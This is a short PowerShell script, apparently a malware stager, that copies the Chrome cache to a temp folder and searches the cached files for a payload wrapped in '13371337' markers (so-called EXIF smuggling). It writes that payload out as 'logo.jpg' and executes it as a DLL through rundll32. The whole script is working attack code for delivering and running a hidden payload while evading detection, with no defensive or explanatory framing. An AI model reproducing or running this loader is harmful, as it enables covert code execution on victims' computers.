$output_path = "$env:temp\exif_smuggling\";
$cache_path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\Cache_Data\";

# ensure $output_path exits
mkdir -Force $output_path > $null;

# copy cache files to new path
cp "$cache_path\*" $output_path;

# iterate each file in the cache directory
Get-ChildItem $output_path |% {
    # read the file's content
    $file = [System.IO.File]::ReadAllBytes($_.FullName);
    $content = [System.Text.Encoding]::Default.GetString($file);

    # search for our 13371337 tags using RegEx
    $match = [regex]::Match($content, "(?s)13371337(.*?)13371337");

    # if a match is successful, we found our cached image
    if ($match.Success) {
        # extract the payload from between the two tags
        $extracted = [System.Text.Encoding]::Default.GetBytes($match.Groups[1].Value);

        # write payload to a file named logo.jpg
        [System.IO.File]::WriteAllBytes("$output_path\logo.jpg", $extracted);

        # use rundll32.exe to load the payload (payload must be a DLL file)
        rundll32.exe "$output_path\logo.jpg",run;
        break;
    }
}
